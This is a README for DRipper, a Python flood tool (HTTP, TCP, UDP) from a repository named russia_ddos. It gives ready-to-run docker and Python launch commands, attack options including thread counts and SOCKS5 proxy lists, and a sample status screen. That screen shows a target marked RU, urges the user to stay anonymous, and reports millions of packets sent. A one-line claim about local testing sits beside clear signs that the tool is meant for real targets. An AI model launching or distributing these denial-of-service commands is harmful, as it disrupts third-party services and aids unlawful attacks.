# DRipper

[![Build status][actions build badge]][actions build link]
[![Docker Pulls][docker pulls badge]][docker pulls link]
[![Docker Image Version (latest semver)][dockerhub badge]][dockerhub link]

DESCRIPTION
-----------

This is reworked version of [DRipper](https://gist.github.com/scamp/33807688d0ebdcfbd4c29a4b992a8b54).
This script support HTTP/TCP/UDP flood attack. We recommend using this script for your own test purposes in the local (on-premise) environment to improve your own web services against DDoS attacks.

## Prerequisites

- Python 3.9 or better
- Docker (optional) if you'd like to run script with docker

## How it looks

```bash
                                                                                
              ██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗               
              ██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║               
              ██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝               
              ██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗               
              ██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║               
              ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝               
                                                          v2.0.0                
                                                                                
        It is the end user's responsibility to obey all applicable laws.        
        It is just like a server testing script and Your IP is visible.         
                                                                                
                      Please, make sure you are ANONYMOUS!                      
                                                                                
 ────────────────────────────────────────────────────────────────────────────── 
  Description                       Status                                      
 ────────────────────────────────────────────────────────────────────────────── 
  Start Time                        2022-02-24 04:00:00                         
  Your Public IP / Country          131.*.*.* / AR                              
  Host IP / Country                 192.168.0.1:80 / RU                        
  Load Method                       UDP                                         
 ────────────────────────────────────────────────────────────────────────────── 
  Threads                           50                                          
  vCPU Count                        16                                          
  Random Packet Length              True / Max length: 2048                     
 ────────────────────────────────────────────────────────────────────────────── 
  CloudFlare DNS Protection         Not protected                               
  Last Availability Check           04:10:52                                    
  Host Availability                 Accessible in 21 of 21 zones (100%)         
 ────────────────────────────────────────────────────────────────────────────── 
  UDP Statistic                                                                 
 ────────────────────────────────────────────────────────────────────────────── 
  Duration                          0:12:11                                     
  Sent Packets                      10,332,191                                     
  Sent Bytes                        2.22 GB                                   
  Connection Success                2                                           
  Connection Failed                 29                                          
  Connection Success Rate           6%                                          
 ────────────────────────────────────────────────────────────────────────────── 
                        Press CTRL+C to interrupt process.                       
                                                                                
                               #StandWithUkraine                               
```

## Usage

DRipper can run on Windows/Linux/macOS from command line.
We recommend to use `PowerShell` for Windows users to run the script, Linux/macOS users can use any shell.

Run `python DRipper --help` to see detailed params description.

```bash

██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                           v2.0.0

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible.

Please, make sure you are ANONYMOUS!

Usage: python DRipper.py [options] arg

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT (default: 80)
                        Port number.
  -t THREADS, --threads=THREADS (default: 100)
                        Threads count.
  -r RANDOM_PACKET_LEN, --random_len=RANDOM_PACKET_LEN (default: 1)
                        Send random packets with random length .
  -l MAX_RANDOM_PACKET_LEN, --max_random_packet_len=MAX_RANDOM_PACKET_LEN
                        Max random packets length (default: 48 for udp, 1000 for tcp, 0 for http).
  -m ATTACK_METHOD, --method=ATTACK_METHOD (default: udp)
                        Attack method: udp, tcp, http.
  -s HOST, --server=HOST
                        Attack to server IP.
  -y FILENAME, --proxy_list=FILENAME
                        File with sock5 proxies in ip:port:username:password or ip:port line format.
  -c STATE, --health_check=STATE (default: 1)
                        Controls health check availability. Turn on: 1, turn off: 0.
  -e HTTP_METHOD, --http_method=HTTP_METHOD (default: GET)
  -a HTTP_PATH, --http_path=HTTP_PATH (default: /)
  -o SOCKET_TIMEOUT, --socket_timeout=SOCKET_TIMEOUT (default: 10 without proxy, 20 with proxy)
                        Timeout in seconds for socket connection is seconds.

Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100
```

## How to Run

#### Using Docker

```bash
# HTTP flood
docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m http

# TCP flood
docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m tcp -l 2048

# UDP flood
docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m upd -l 2048
```

#### Directly with Python.

Ensure you have Python 3.9 or better installed. Then clone this repo and run DRipper.py with params you need

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# Install python dependencies:
pip install -r requirements.txt

# Run script
python -u DRipper.py -s 127.0.0.1 -p 80 -t 100 -r 1 -m udp
# OR
python3 -u DRipper.py -s 127.0.0.1 -p 80 -t 100 -r 1 -m udp
```

#### Kubernetes

You can deploy and run DRipper in Kubernetes cluster using [kube-dripper][kube-dripper-link] terraform configuration.
For details - see the [README][kube-dripper-readme] from **kube-dripper** project.

## How to run unit tests

#### Prepare
```bash
pip install pytest
```

#### Run
```bash
pytest
```

# License

This project is distributed under the MIT License, see [LICENSE](./LICENSE) for more information.

<!-- External links -->
[actions build badge]: https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml/badge.svg
[actions build link]:  https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml

[docker pulls link]:   https://hub.docker.com/r/alexmon1989/dripper
[docker pulls badge]:  https://img.shields.io/docker/pulls/alexmon1989/dripper
[dockerhub link]:      https://hub.docker.com/r/alexmon1989/dripper/tags
[dockerhub badge]:     https://img.shields.io/docker/v/alexmon1989/dripper?label=DockerHub

[kube-dripper-link]:   https://github.com/denismakogon/kube-dripper
[kube-dripper-readme]: https://github.com/denismakogon/kube-dripper/blob/main/README.md
